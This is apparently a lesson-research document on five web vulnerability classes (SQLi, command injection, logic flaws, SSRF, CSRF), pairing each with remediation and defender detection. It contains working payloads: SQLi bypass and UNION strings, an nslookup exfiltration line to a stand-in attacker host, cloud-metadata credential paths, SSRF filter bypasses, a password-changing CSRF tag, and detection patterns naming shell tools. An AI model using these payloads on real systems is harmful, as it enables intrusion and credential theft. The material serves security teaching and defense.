# Web Vulnerability Depth — lesson-grade research
### SQL injection · Command injection · Business logic flaws · SSRF · CSRF
Track 09 · Researched 2026-10-09 · Governing brief: SECURITY_GUIDEBOOK_BRIEF-2.md (§5, §7)

Each class follows the brief's lesson frame: what the flaw is → why it arises in real code → how it is found in authorized testing → minimal proof-of-concept on a local/permissioned target → remediation → how defenders detect it. Authorization notice opens every hands-on lesson; PoCs target DVWA, Juice Shop, WebGoat, and PortSwigger Academy labs only.

---

## 1. SQL INJECTION (CWE-89)

### What it is
The application builds a database query by concatenating attacker-controlled input into the SQL string. The input stops being data and becomes code — the database executes the attacker's SQL as part of its own query. PortSwigger's definition: the attacker "interferes with the queries that an application makes to its database," reading, modifying, or deleting data the application can reach, and in some cases compromising the host.

### Why it arises in real code
String concatenation in query construction: `SELECT * FROM products WHERE category = '` + input + `'`. It also arises in less obvious sinks — `ORDER BY` clauses, table/column names, `LIKE` patterns — where bind variables cannot be used. Second-order injection: input stored safely, then concatenated into a later query when the developer wrongly treats stored data as trusted.

### The three families (and how each is found)
- **In-band (union / error-based).** Query results or database errors return in the response. Detection probe: a single quote `'`, then boolean pairs (`' OR 1=1--` vs `' OR 1=2--`) watching for response differences. UNION attacks require matching column count (`ORDER BY n` to find it) and compatible types; `NULL` placeholders fill columns the attacker doesn't care about.
- **Blind.** No output in the response. Two channels: **boolean-based** (infer one bit per request from response differences — a true/false condition changes the page) and **time-based** (`SLEEP()` / `pg_sleep()` / `WAITFOR DELAY`, measuring response latency). Slower, but fully exploitable.
- **Out-of-band (OAST).** The injected query triggers a DNS/HTTP interaction to infrastructure the tester controls (e.g., Burp Collaborator). Powerful where blind is impractical; data can be exfiltrated inside the DNS lookup itself. DBMS-specific functions required.

### Database-specific notes
- **MySQL/MariaDB:** comment `-- ` (with trailing space) and `#`; `SLEEP(n)` for time-based; `information_schema` for enumeration; `LOAD_FILE()`/`INTO OUTFILE` for file access when privileges allow.
- **PostgreSQL:** `--` comments; `pg_sleep(n)`; stacked queries commonly possible; `current_user`, `version()`.
- **MSSQL:** `--` comments; `WAITFOR DELAY '0:0:5'`; stacked queries via `;`; `@@version`. Error-based extraction via `CONVERT(int, ...)` type errors.
- **Oracle:** `--` comments; no stacked queries in most drivers; `v$version` for version; `dbms_pipe.receive_message` for time delays. Fingerprint first: which delay function works reveals the DBMS.

### Minimal PoC (DVWA, SQL Injection module, Low)
`1' OR '1'='1` in the user-ID field returns all users — the classic logic subversion. Login-bypass variant on Juice Shop ("Login Admin"): `' OR 1=1--` in the email field. Read-only proof is sufficient for a report: column count via `ORDER BY`, then `' UNION SELECT NULL,@@version,NULL--` (MySQL) — readable data in the response is a valid confirmed finding. Never dump more than needed to prove impact.

### Remediation (checkpoints)
1. **Parameterized queries / prepared statements** — the primary defense (OWASP). The query string is a hard-coded constant; every input is a bound parameter. The database always distinguishes code from data.
2. **Where bind variables can't go** (table/column names, `ORDER BY` direction): allow-list validation — map input to a fixed set of legal values, never concatenate.
3. **Stored procedures**: only as safe as their implementation — audit for `EXEC`/`sp_executesql` with dynamic SQL inside; those reintroduce the flaw.
4. **Escaping is strongly discouraged** by OWASP: database-specific, fragile, no guarantee.
5. **ORM pitfalls**: ORMs parameterize normal queries, but raw-query methods (`.raw()`, string-built `where` clauses, HQL/JPQL concatenation) reintroduce injection. Audit every raw path.
6. **Least privilege**: the application DB account gets only the rights it needs; never DBA/admin.

### Detection (defender view)
- **WAF logs (ModSecurity + OWASP CRS):** SQLi rules live in the 942xxx family (`REQUEST-942-APPLICATION-ATTACK-SQLI.conf`; rule 942100 is the libinjection-based headline detector). Look for matched rule IDs, the offending argument, and anomaly scores in the audit log. Attackers evade naive filters with comment injection (`SE/**/LECT`), MySQL version comments (`/*!50000 UNION*/`), case mixing, and whitespace substitution — detection should key on anomaly scoring, not single signatures.
- **Database query logs:** slow-query logs catch time-based blind attacks (repeated multi-second `SLEEP`/`pg_sleep`/`WAITFOR` queries from one client); general query logs show UNION patterns and `information_schema` enumeration. Baseline normal query shapes; alert on structural deviation.
- **Application logs:** repeated 500s from malformed quotes during probing; sudden error-message content changes.

### Labs
- **PortSwigger Academy — SQL injection** (18+ labs: WHERE-clause retrieval, login bypass, UNION attacks, blind boolean/time, OAST exfiltration, second-order, filter bypasses).
- **DVWA** — SQL Injection module (Low→High; Impossible shows the parameterized fix), SQL Injection (Blind) module.
- **Juice Shop** — "Login Admin", "Login Bender", "Login Jim" (bypass); "User Credentials" (UNION retrieval); "Database Schema" (enumeration).
- **WebGoat** — SQL Injection lessons.

---

## 2. OS COMMAND INJECTION (CWE-78; parent CWE-77)

### What it is
User input reaches an OS shell command — via `system()`, `shell_exec()`, backticks, `Runtime.exec()` with a shell, or similar — and shell metacharacters in the input break out of the intended argument into new commands. PortSwigger: the attacker executes OS commands on the application server, "typically fully compromise the application and its data."

### Why it arises in real code
Legacy integrations (a Perl/PHP script shelling out to a reporting binary), convenience wrappers around system utilities (`ping`, `mail`, `convert`), and the false belief that a numeric or constrained input can't contain metacharacters. The DVWA case is canonical: an IP address passed to `ping` via `shell_exec()`.

### Shell metacharacter classes (what to probe, in order)
- **Command separators (Windows + Unix):** `&` `&&` `|` `||`
- **Separators (Unix only):** `;` newline (`0x0a`)
- **Inline execution (Unix):** backticks `` `cmd` `` and `$(cmd)`
- **Quoted contexts:** if input lands inside quotes in the original command, terminate the quote first (`"` or `'`), then a separator.
- **Blind detection:** `& ping -c 10 127.0.0.1 &` (time delay); output redirection `& whoami > /var/www/static/poc.txt &` then fetch the file; OAST `& nslookup <unique>.attacker-controlled &` with backtick exfiltration `` `whoami` `` embedded in the lookup.

### Minimal PoC (DVWA, Command Injection module, Low)
`; whoami` or `& echo VULN-TEST &` in the IP field — injected output appears in the response. Keep it to `whoami`/`id`; the finding is proven the moment injected output renders. Do not pivot, persist, or touch other systems.

### Remediation (checkpoints)
1. **Never call out to OS commands from application code** — the single most effective rule (PortSwigger). Almost every use case has a safer platform API (language libraries for DNS, mail, image processing).
2. **If unavoidable:** validate against an allow-list of permitted values; or validate the input is strictly numeric; or restrict to alphanumeric with no syntax or whitespace.
3. **Never sanitize by escaping metacharacters** — OWASP/PortSwigger both mark this as error-prone and bypassable.
4. Least privilege on the application OS account; the web process should not run as root/system.

### Detection (defender view)
- **Sysmon/EDR process-creation telemetry:** Sysmon Event ID 1 (ProcessCreate) on Windows; auditd `execve` on Linux. What to hunt: a web-server worker (`w3wp.exe`, `httpd`, `php-fpm`, `node`) as **ParentImage** spawning `cmd.exe`/`powershell.exe`/`sh`/`bash` — a web process has no legitimate reason to spawn shells. CommandLine fields containing separators or `whoami`/`id`/`curl`/`wget`/`nc` from that parent are high-fidelity.
- **WAF logs (ModSecurity + CRS):** command-injection/RCE rules in the 932xxx family (`REQUEST-932-APPLICATION-ATTACK-RCE.conf`; e.g., rule 932230 matched Unix command injection in CRS's own tests).
- **Application logs:** the probing phase leaves distinctive 500s/timeouts from malformed separator payloads.

### Labs
- **PortSwigger Academy — OS command injection** (5 labs: simple case, blind with time delays, blind with output redirection, blind with OAST exfiltration).
- **DVWA** — Command Injection module (Low→High; Impossible shows the allow-list fix).
- **Juice Shop** — "SSTi" challenge (server-side template injection reaching command execution — the adjacent class, marked expert).

---

## 3. BUSINESS LOGIC FLAWS (CWE-840; workflow: CWE-841)

### What it is
Not a broken control but a broken *assumption*: the application's own rules don't hold when a user deviates from the expected path. PortSwigger: flaws "in the design and implementation of an application that allow an attacker to elicit unintended behavior," arising from "failing to anticipate unusual application states." Invisible to scanners; the highest-creativity class in bounty work.

### Why it arises in real code
Implicit assumptions — users will use the browser UI (so client-side controls suffice), steps happen in order, numbers are positive, coupons apply once, totals are computed honestly. Complex workflows where no single developer owns the whole state machine.

### Finding methodology (teach this as a discipline)
1. **State-machine mapping.** Enumerate every state of a workflow (cart → checkout → payment → fulfillment) and every transition. Draw it. The flaws live in transitions the designers didn't draw.
2. **Workflow-step analysis.** For each step ask: can it be skipped, repeated, reordered, or revisited? (Repeat = coupon reuse, double-spend. Skip = checkout without payment. Reorder = confirm before paying.)
3. **Trust-boundary review.** Mark every value the client supplies that the server *uses*: price, quantity, discount, currency, user ID, step index. Each is a candidate for tampering. Server must re-derive totals from its own data, never accept client-computed amounts.
4. **Numeric edge fuzzing.** For every numeric field: `-1`, `0`, `0.0001`, huge values, `NaN`, `Infinity`, negative discounts/tips. Watch the computed total.
5. **Race/parallelism check.** Where two requests touch the same balance/coupon/stock, fire them concurrently — last-byte-sync or simple parallel POSTs.

### Real disclosed examples (study these)
1. **Shopify — cart price manipulation via negative quantity** (HackerOne #482452): negative quantity accepted at checkout, driving the order total down.
2. **PayPal — negative amount in transaction** (HackerOne #176053): a negative transaction amount credited rather than debited.
3. **Starbucks — race condition on rewards points** (HackerOne #270995): concurrent requests double-spent loyalty points.
4. **Reverb.com — gift-card race condition** (HackerOne #759247): parallel redemption bypassed single-use limits.
5. **Upserve/OLO — total price manipulation using negative quantities** (HackerOne #364843): negative line items reduced the order total below cost.

### Minimal PoC (PortSwigger Academy lab, local/permissioned)
"Excessive trust in client-side controls": intercept `POST /cart`, change the `price` parameter to a lower value, complete checkout — the server charges the tampered price. One tampered purchase proves it; do not actually steal.

### Remediation (checkpoints)
1. Server-side recalculation of all money values from trusted sources; never trust client-computed totals.
2. Validate numeric ranges server-side: integers, positive, bounded; consistent rounding.
3. Enforce workflow order server-side (state machine, not UI flow); make transitions idempotent where repeatable.
4. Single-use tokens consumed atomically for coupons/credits/gift cards.
5. Design documents for every transaction workflow, assumptions written down and tested.

### Detection (defender view)
- **Application/business logs:** negative totals, zero-value orders, quantity < 0, coupon reuse counts > 1, rapid-fire duplicate requests (race attempts), totals that don't reconcile with line items. These are *business* anomalies, not signature hits — detection is reconciliation rules and thresholds, e.g., alert on any order with total ≤ 0 or discount > item value.
- **WAF:** largely blind to logic flaws — no malicious syntax involved. This is why the class pays: it bypasses the entire signature layer.

### Labs
- **PortSwigger Academy — Business logic vulnerabilities** (11+ labs: excessive trust in client-side controls, low-level logic flaws, inconsistent handling of exceptional input, weak isolation on dual-use endpoints, insufficient workflow validation, authentication bypass via flawed state machine, etc.).
- **Juice Shop** — "Christmas Special" (logic bypass), "Payback Time" (negative quantity), "Zero Stars" (unbounded input).

---

## 4. SERVER-SIDE REQUEST FORGERY — SSRF (CWE-918)

### What it is
The attacker makes the *server* issue HTTP requests to unintended destinations — internal services, loopback admin interfaces, or the cloud instance-metadata service — by controlling a URL (or part of one) the server fetches. PortSwigger: it "allows an attacker to cause the server-side application to make requests to an unintended location," escalating through trust relationships the server enjoys but the attacker doesn't.

### Why it arises in real code
Features that fetch URLs: webhooks, file-import-by-URL, PDF generators, image proxies, "check stock" APIs taking a `stockApi` URL, analytics that visit Referer URLs, OAuth `redirect_uri` handling, XXE-adjacent XML parsers. The server is inside the trust boundary; the developer forgets the URL is attacker-controlled.

### Finding it in authorized testing
Look for request parameters containing full or partial URLs (`url=`, `webhook=`, `stockApi=`, `path=`), Referer-triggered fetching, and file-type conversions. Confirm with a Collaborator/OAST domain first (blind-safe), then escalate to loopback (`http://127.0.0.1/admin`) and, on cloud-hosted targets *in scope*, the metadata endpoint. Partial-URL cases (only hostname controllable) limit but don't eliminate impact.

### Cloud metadata endpoints — the impact multiplier
- **AWS:** `http://169.254.169.254/latest/meta-data/` — IMDSv1 answers unauthenticated GETs; `iam/security-credentials/<role>` returns temporary credentials. IMDSv2 requires a PUT-issued session token (`X-aws-ec2-metadata-token`) plus hop limit.
- **GCP:** `http://metadata.google.internal/computeMetadata/v1/` — requires the `Metadata-Flavor: Google` header (trivially supplied if the SSRF forwards headers).
- **Azure:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01` — requires `Metadata: true` header; the identity token endpoint returns OAuth2 tokens.
- Defense in depth, in order: enforce IMDSv2 / header-required metadata; deny egress to 169.254.0.0/16 from workloads that don't need it; DNS-rebinding-safe fetchers. Note for the lesson: header requirements stop only the simplest SSRFs.

### Filter bypasses (why denylists fail — teach as checkpoints)
- **Denylist bypasses:** alternate IP representations (`2130706433`, `017700000001`, `127.1`), attacker domain resolving to 127.0.0.1, URL-encoding/case tricks, open-redirect chains (validate-then-redirect).
- **Allowlist bypasses:** `@`-credential embedding (`https://expected-host@evil-host`), `#` fragments (`https://evil-host#expected-host`), subdomain shadowing (`expected-host.evil-host`), parser differentials between validator and fetcher, double-encoding.
- **Checkpoint rule:** validate the *resolved, canonicalized* URL after following redirects, against an allow-list, with no userinfo, no fragments, and resolved IPs checked against deny ranges. Anything less is a bypass waiting to happen.

### Minimal PoC (PortSwigger Academy lab, permissioned)
"Basic SSRF against the local server": change `stockApi` to `http://localhost/admin`, read the returned admin page. One request proves server-side fetch; for metadata, stop at reading the role *name* — never exfiltrate credentials, even in a lab you own, as discipline.

### Remediation (checkpoints)
1. Don't accept user-controlled URLs where avoidable; use identifiers mapped server-side to allow-listed destinations.
2. Validate canonicalized post-redirect URLs against an allow-list; deny private/loopback/link-local ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16).
3. Disable redirects in the fetcher or re-validate after each hop.
4. Egress controls: the application host should not be able to reach the metadata service or internal networks it doesn't need.
5. Enforce IMDSv2 (AWS) at the infrastructure level regardless of application fixes.

### Detection (defender view)
- **Egress proxy/firewall logs:** the highest-value signal — outbound connections from application servers to 169.254.169.254, metadata hostnames, or internal RFC-1918 ranges the app never legitimately contacts. Alert on any app-tier host initiating connections to link-local metadata IPs.
- **WAF logs:** SSRF-specific CRS coverage is thin; custom rules on URL parameters containing `@`, `#`, encoded IPs, or metadata hostnames help but are bypassable — treat as tripwires, not barriers.
- **Application logs:** stockApi/webhook parameters with unexpected hosts; redirect chains in fetch logs.

### Labs
- **PortSwigger Academy — SSRF** (7 labs: basic against localhost, against back-end systems, blind SSRF with OAST, blacklist bypass, whitelist bypass, open-redirect bypass).
- **DVWA** — no dedicated SSRF module; practice via PortSwigger labs and local webhook-receiver exercises.

---

## 5. CROSS-SITE REQUEST FORGERY — CSRF (CWE-352)

### What it is
The attacker's site induces the victim's browser to issue an authenticated request to the target — the browser attaches the session cookie automatically, and the target can't distinguish the forged request from a legitimate one. PortSwigger's three preconditions: a relevant action, cookie-based session handling, and no unpredictable request parameters.

### Why it arises in real code
State-changing actions exposed via simple POSTs (or worse, GETs) with no per-request proof of intent. SPAs that rely on cookies without token defenses. "It works in the browser" testing never submits the request cross-site, so the gap is invisible in normal QA.

### Token validation checkpoints (generation → binding → verification)
1. **Generation:** cryptographically random, unique per session (per-request tokens are stronger but break back-button flows — know the tradeoff). Never derive from user ID or email alone.
2. **Binding:** the token must be tied to the authenticated session. Naive double-submit (cookie value == request value, no session binding) falls to cookie injection from a sibling subdomain or plaintext-HTTP network position. The signed variant HMACs session data into the token.
3. **Verification:** constant-time comparison of the request-supplied token against the session-bound value; reject on missing *or* mismatched; never accept the cookie value as the proof (cookies are auto-sent — that's the whole vulnerability).
4. **Transmission:** token in hidden form field or custom header — never in the URL (leaks via history, logs, Referer).

### SameSite semantics (the browser's own checkpoint)
- **Strict:** cookie never sent cross-site. Strongest; breaks legitimate cross-site flows (SSO callbacks).
- **Lax:** sent on top-level GET navigations, not on POSTs or subrequests. Chrome default since 2021; other browsers followed. Defeats classic POST CSRF but not GET-based state changes or top-level GET attacks.
- **None:** sent cross-site; requires `Secure`. Needed for intentional cross-site embedding.
- Lesson point: SameSite=Lax is a baseline, not a complete defense — GET-based actions and Lax-bypass techniques (e.g., 2-minute refresh window quirks, top-level GET with side effects) remain.

### Custom-header and double-submit patterns — and where each fails
- **Custom headers** (`X-CSRF-Token` via JS): cross-site pages can't set custom headers on simple requests due to SOP/preflight — strong for AJAX APIs. Fails if the API also accepts form-encoded requests without the header, or if CORS is misconfigured to allow the header cross-origin.
- **Double-submit cookie:** stateless and simple. Fails via cookie injection (subdomain takeover, MITM on HTTP) unless the token is cryptographically bound to the session (signed double-submit).
- **Referer/Origin validation:** cheap defense-in-depth. Fails when browsers strip Referer (privacy settings, downgrade HTTPS→HTTP) — must fail *closed* with an allow-list, and never as the sole defense.
- **Fetch Metadata headers** (`Sec-Fetch-Site`): modern, strong where supported — the server rejects `cross-site` values on state-changing endpoints. Fails on older browsers; use as a layer, not the only one.
- **User-interaction** (re-authentication, OTP) for high-value actions: the strongest per-action control.

### Minimal PoC (DVWA, CSRF module, Low — password change via GET)
Craft `<img src="http://dvwa/vulnerabilities/csrf/?password_new=x&password_conf=x&Change=Change">`; loading it in a logged-in browser changes the password. One self-contained GET proves the class. For POST targets, a minimal auto-submitting form is the equivalent proof. In PortSwigger's "CSRF with no defenses" lab, the email-change form is the canonical exercise.

### Remediation (checkpoints)
1. Anti-CSRF tokens on every state-changing request, validated server-side against the session (framework built-ins preferred over hand-rolled).
2. `SameSite=Lax` minimum on session cookies; `Strict` where flows allow.
3. No state changes via GET — ever.
4. Defense in depth: Origin/Referer checks and Fetch Metadata validation as additional layers.
5. Step-up authentication for high-value actions (password change, email change, transfers).

### Detection (defender view)
- **Application logs:** state-changing requests with missing/invalid CSRF tokens (log the event, never the token value); Referer/Origin mismatches on POST endpoints; GET requests hitting state-changing endpoints.
- **WAF:** CSRF is nearly invisible to signature WAFs — the forged request is syntactically identical to a legitimate one. Detection is application-layer: token-validation failures and origin anomalies. This is why the lesson teaches it as a design flaw, not a payload problem.

### Labs
- **PortSwigger Academy — CSRF** (12 labs: no defenses, token validation bypasses — token tied to non-session cookie, not tied to session, tied to session but not validated, leaked in URL — SameSite bypasses — Strict bypass via client-side redirect, Lax bypass via method override — Referer-based defense bypasses).
- **DVWA** — CSRF module (Low→High; Impossible shows the token implementation).
- **WebGoat** — CSRF lessons.

---

## Source ledger (fetched 2026-10-09)

| Claim / resource | Primary URL | Date | Status |
|---|---|---|---|
| SQLi prevention: parameterized queries primary defense; escaping discouraged; ORM note | https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html | 2026-10-09 | verified |
| SQLi types: in-band, blind (boolean/time), OAST; second-order; DB differences; WAF evasion note | https://portswigger.net/web-security/sql-injection | 2026-10-09 | verified |
| OS command injection: metacharacter classes; blind techniques (time/redirect/OAST); prevention (never shell out; allow-list; never escape) | https://portswigger.net/web-security/os-command-injection | 2026-10-09 | verified |
| Business logic flaws: definition, causes, impact, prevention practices | https://portswigger.net/web-security/logic-flaws | 2026-10-09 | verified |
| SSRF: definition, trust relationships, blacklist/whitelist bypasses, open-redirect bypass, blind SSRF | https://portswigger.net/web-security/ssrf | 2026-10-09 | verified |
| CSRF: three preconditions, token/SameSite/Referer defenses, bypass lab links | https://portswigger.net/web-security/csrf | 2026-10-09 | verified |
| CSRF prevention: synchronizer token, double-submit (naive vs signed), custom headers, SameSite, Fetch Metadata; XSS defeats CSRF mitigations | https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html | 2026-10-09 | verified |
| PortSwigger lab counts (SQLi 18, cmd inj 5, logic 11, SSRF 7, CSRF 12) | community trackers (ashishnagar496, blueorionn) | 2026-10-09 | operator-added — write as "18+" at build time; counts grow |
| DVWA modules: SQL Injection, SQL Injection (Blind), Command Injection, CSRF; 4 difficulty levels | community VAPT reports (humustafa, golinuxcloud) | 2026-10-09 | operator-added — canonical repo is digininja/DVWA |
| Juice Shop injection challenges: Login Admin/Bender/Jim, User Credentials, Database Schema, SSTi | https://owasp.org/www-project-juice-shop/ and https://pwning.owasp-juice.shop/companion-guide/latest/part2/injection.html | 2026-10-09 | verified |
| Cloud metadata endpoints (AWS/GCP/Azure) + header requirements + IMDSv2 | community cloud-security references (maverick-hackz, itxprashant) | 2026-10-09 | operator-added — verify against AWS/GCP/Azure docs at build time |
| Disclosed logic-flaw cases (Shopify #482452, PayPal #176053, Starbucks #270995, Reverb #759247, Upserve #364843) | HackerOne hacktivity via community compilations | 2026-10-09 | operator-added — re-verify report IDs/URLs at build time |
| CRS rule families: 942xxx SQLi, 932xxx RCE/command injection (932230 in CRS test suite) | CRS test documentation via community mirror | 2026-10-09 | operator-added — verify against coreruleset.org at build time |
| Sysmon Event ID 1 process-creation as command-injection telemetry | community SOC references | 2026-10-09 | operator-added — canonical: Sysmon schema docs |

## Gaps
1. PortSwigger per-topic lab counts drift — write as "18+" style at build time.
2. DVWA canonical repo (digininja/DVWA) not fetched this pass; module names corroborated by multiple community sources — re-verify before lesson ships.
3. WebGoat lesson names for SQLi/CSRF not individually verified — mark as lead.
4. Cloud metadata endpoint details from community references — verify against AWS (IMDSv2 docs), GCP, Azure primary docs at build time.
5. HackerOne report IDs for logic-flaw cases from community compilations — re-verify each URL before citing.
6. CRS rule IDs from a community mirror of CRS docs — confirm at coreruleset.org.
7. NoSQL injection (Juice Shop "NoSQL Manipulation") noted but out of this track's five-class scope — belongs to the second-wave lesson.
